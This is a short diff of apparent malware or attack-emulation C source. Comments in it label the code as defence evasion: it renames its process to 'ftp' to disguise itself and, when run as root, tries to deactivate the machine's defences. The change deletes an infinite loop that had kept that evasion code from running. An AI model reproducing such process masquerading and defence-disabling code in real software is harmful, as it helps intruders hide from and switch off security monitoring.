@@ -10,8 +10,6 @@ int main(int argc, char* argv[]){
     /* Defence Evasion: Rename process to 'ftp' */
     prctl(PR_SET_NAME, "ftp");
 
-    while(1);
-
     /* Defence Evasion: If  root privilege */
     /* Try to deactivate defences on the machine */
     if (getuid() == ROOT_UID) {
